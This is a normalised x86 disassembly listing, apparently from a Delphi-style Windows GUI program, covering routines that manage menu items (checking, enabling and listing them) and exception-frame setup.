mov edx [ ebp - 0x8 ]
add [ eax ] edx
mov eax [ ebx ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x3c ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x29 ] 0x0
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x8
mov eax [ ebx ]
call sub_46342c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x29 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
movzx eax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x29 ] al
jmp r-xdata
mov eax [ ebx ]
movzx esi [ eax + 0x5c ]
test si si
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffd0
mov edx [ ebx ]
mov edx [ edx + 0x30 ]
call sub_449d80
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_462374
mov ecx [ ebp - 0x24 ]
mov eax [ ebx ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffd0
call sub_44a0e8
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x29 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x34 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x34 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x38 ]
mov eax [ ebx ]
call sub_4637c0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
add [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465c40
lea eax [ ebp - 0x24 ]
call j_sub_449348
retn
sub_465c4f
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_465eb2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov si 0xfff2
call sub_4483f8
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov [ ebp - 0x21 ] 0x0
mov [ ebp - 0x21 ] 0x1
push ebp
call sub_46582c
pop ecx
jmp r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
call sub_44c2c8
mov dl 0x7
call sub_44c394
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
call sub_4657fc
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
call sub_466650
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor edx edx
mov eax 0x6
call sub_43a7f0
test al al
je r-xdata
mov eax [ ebp - 0x1c ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call j_sub_44a294
jne r-xdata
push ebp
call sub_465878
pop ecx
jmp r-xdata
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x14 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
mov ebx [ eax + 0x48 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x1c ]
cmp [ eax + 0x3c ] 0xffffffff
jg r-xdata
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_465eb9
lea eax [ ebp - 0x3c ]
call j_sub_449348
lea eax [ ebp - 0x30 ]
call j_sub_449348
retn
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebx + 0xa4 ]
call [ ebx + 0xa0 ]
mov eax [ ebp - 0x14 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x14 ]
mov [ edx ] eax
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp - 0x14 ]
mov [ eax ] 0x10
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0x0
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_432a2c
cmp [ ebp - 0x28 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x14 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax [ ebp - 0x28 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov [ ebp - 0x29 ] 0x0
jmp r-xdata
mov [ ebp - 0x29 ] 0x0
mov eax [ ebp - 0x28 ]
movzx eax [ eax + 0x60 ]
mov [ ebp - 0x29 ] al
jmp r-xdata
mov eax [ ebp - 0x1c ]
movzx ebx [ eax + 0x5c ]
test bx bx
je r-xdata
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x1c ]
mov edx [ edx + 0x30 ]
call sub_449d80
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_462374
mov ecx [ ebp - 0x3c ]
mov eax [ ebp - 0x1c ]
mov edx [ eax + 0x30 ]
lea eax [ ebp - 0x30 ]
call sub_44a0e8
jmp r-xdata
movzx eax [ ebp - 0x29 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov eax [ ebp - 0x34 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x1c ]
call sub_4634d8
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x10 ]
add eax 0x7
mov edx [ ebp - 0x14 ]
add [ edx ] eax
sub_465ee8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call j_sub_44a294
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_449d2c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_465f10
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_466084
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x60 ]
call sub_466094
cmp ebx eax
je r-xdata
movzx edx [ eax + 0x3b ]
cmp dl [ ebx + 0x3b ]
jne r-xdata
xor edx edx
call sub_465f5c
sub_465f5c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x34 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x34 ] bl
mov edi [ esi + 0x60 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x39 ] 0x0
je r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x4c ]
push eax
mov eax edi
call sub_46342c
push eax
call CheckMenuItem
mov eax esi
call sub_465f10
sub_465fb0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x35 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x35 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x60 ]
test edi edi
je r-xdata
mov eax esi
call sub_466084
test eax eax
jne r-xdata
mov edi [ esi + 0x60 ]
test edi edi
je r-xdata
cmp [ edi + 0x68 ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
movzx eax bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x4c ]
push eax
mov eax edi
call sub_46342c
push eax
call EnableMenuItem
sub_466028
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3b ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x60 ]
test edi edi
je r-xdata
mov [ esi + 0x3b ] bl
cmp [ esi + 0x34 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_4663f4
mov edx eax
mov ecx ebx
mov eax edi
call sub_4633cc
cmp [ esi + 0x39 ] 0x0
je r-xdata
mov eax esi
call sub_465f10
sub_466094
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x58 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4246e8
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4622cc
sub_466104
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x60 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_466084
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_4660ec
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x60 ]
mov edx ebx
mov eax edi
call sub_466428
mov ecx ebx
mov edx esi
mov eax edi
call sub_466210
sub_46614c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_466084
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_466094
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_4661a4
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x36 ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x36 ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x60 ] 0x0
je r-xdata
mov eax [ ebp + 0x60 ]
call sub_466084
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x60 ]
call sub_466094
mov [ eax + 0x36 ] 0x0
mov edx esi
mov eax [ ebp + 0x60 ]
call sub_466094
cmp [ eax + 0x36 ] 0x0
je r-xdata
sub_466210
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x58 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4622cc
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x58 ] eax
movzx ecx [ esi + 0x3b ]
mov edx edi
mov eax ebx
call sub_4633cc
mov ecx esi
mov edx edi
mov eax [ ebx + 0x58 ]
call sub_424768
mov [ esi + 0x60 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_466494
cmp [ ebx + 0xac ] 0x0
je r-xdata
mov eax [ ebx + 0x58 ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_466084
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4632f8
mov edx ebp
mov eax [ ebx + 0x58 ]
call sub_4246e8
movzx eax [ eax + 0x3b ]
cmp al [ esi + 0x3b ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x58 ]
call sub_4246e8
movzx edx [ eax + 0x3b ]
mov eax esi
call sub_466028
sub_4662cc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_4622cc
cmp [ ebx + 0x58 ] 0x0
je r-xdata
mov eax ebx
call sub_466084
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4632f8
mov eax ebx
call sub_466084
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4246e8
mov edi eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_4245dc
xor eax eax
mov [ edi + 0x60 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0xac ] 0x0
je r-xdata
sub_466344
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x35 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
movzx edx [ ebx + 0x34 ]
xor dl 0x1
mov eax ebx
call sub_465f5c
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_46606c
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
mov eax ebx
call sub_46606c
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_46640c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_466084
mov edx eax
mov ecx esi
mov eax ebx
call sub_466210
pop esi
pop ebx
retn
sub_466428
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4663f4
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_4662cc
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_4622cc
sub_466450
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x60 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_466494
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x60 ]
test eax eax
je r-xdata
cmp [ ebx + 0xac ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_466494
jmp r-xdata
mov eax ebx
call sub_4632f8
cmp [ ebx + 0x68 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_4685ec
sub_4664f0
push ebx
mov ebx eax
cmp [ ebx + 0x48 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov eax [ ebx + 0x48 ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebx + 0x48 ] eax
sub_466518
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x40 ] 0x0
jne r-xdata
mov eax [ ebx + 0x40 ]
call sub_4481b0
xor eax eax
mov [ ebx + 0x40 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x40 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_4667b0
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_4483f8
mov edx ebx
mov eax edi
call sub_42e354
mov eax ebx
mov si 0xffee
call sub_4483f8
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x40 ] eax
pop edi
pop esi
pop ebx
retn
sub_466588
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x48 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ esi + 0x48 ] eax
sub_4665bc
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_466084
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_466094
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_4665fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x60 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_466428
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_46640c
jmp r-xdata
mov edx ebx
mov eax esi
call sub_46640c
sub_466660
push ebx
mov ebx eax
cmp dl [ ebx + 0x39 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x39 ] dl
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x39 ] 0x0
je r-xdata
mov eax ebx
call sub_465f10
sub_46668c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
movzx eax [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_465ee8
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x69 ]
mov eax esi
call sub_465f5c
cmp [ esi + 0x34 ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x6a ]
mov eax esi
call sub_465fb0
cmp [ esi + 0x35 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x50 ] eax
cmp [ esi + 0x50 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x54 ]
mov edx [ edi + 0x7c ]
call sub_449d2c
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x39 ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_4660dc
cmp [ esi + 0x3c ] 0xffffffff
jne r-xdata
movzx edx [ edi + 0x6c ]
mov eax esi
call sub_466028
cmp [ esi + 0x3b ] 0x0
jne r-xdata
movzx edx [ edi + 0x84 ]
mov eax esi
call sub_4660b8
cmp [ esi + 0x5c ] 0x0
jne r-xdata
test bl bl
je r-xdata
movzx edx [ edi + 0x86 ]
mov eax esi
call sub_4660cc
cmp [ esi + 0x3a ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_4667b0
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_46606c
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_4483f8
sub_4667d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4667f4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_466814
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_466834
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_466854
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_466874
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_466894
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4668b4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4668d4
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x40 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_4668f4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_424e90
movzx edx [ ebx + 0x35 ]
mov edi esi
mov eax edi
call sub_451830
mov edx [ ebx + 0x50 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x54 ]
mov eax edi
call sub_451a1c
mov edx [ ebx + 0x3c ]
mov eax edi
call sub_451a7c
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_4516c8
movzx edx [ ebx + 0x3a ]
mov eax edi
call sub_451b3c
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_466970
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_42e5b0
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_46606c
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x78 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_466518
jmp r-xdata
cmp edi [ esi + 0x64 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_4669c4
jmp r-xdata
xor edx edx
mov eax esi
call sub_463280
sub_4669c4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x78 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x74 ]
call sub_44fe8c
mov eax ebx
call sub_466a34
pop esi
pop ebx
retn
mov edx [ ebx + 0x74 ]
call sub_44fed0
mov edx ebx
mov eax [ ebx + 0x78 ]
call sub_42e354
sub_466a0c
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_466a0c
mov ecx esi
mov edx [ esi + 0x64 ]
call sub_4628b0
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_466494
mov eax ebx
pop esi
pop ebx
retn
sub_466a48
push ebp
mov ebp esp
push ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_44a680
test eax eax
setne bl
test bl bl
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
add edx 0xfffffffc
mov ecx 0x1
xchg edx eax
call sub_44a438
sub_466a78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
call sub_449d80
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
inc ebx
dec esi
jne r-xdata
sub_466afc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_466c7b
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
mov eax [ esi ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov ebx eax
test ebx ebx
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ esi ]
mov eax esi
call sub_4494dc
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov edi 0x1
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
cmp al 0xf
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c82
lea eax [ ebp - 0x14 ]
mov edx 0x2
call j_sub_44936c
retn
mov edx esi
mov ecx [ ebp - 0x8 ]
mov eax r-xdata
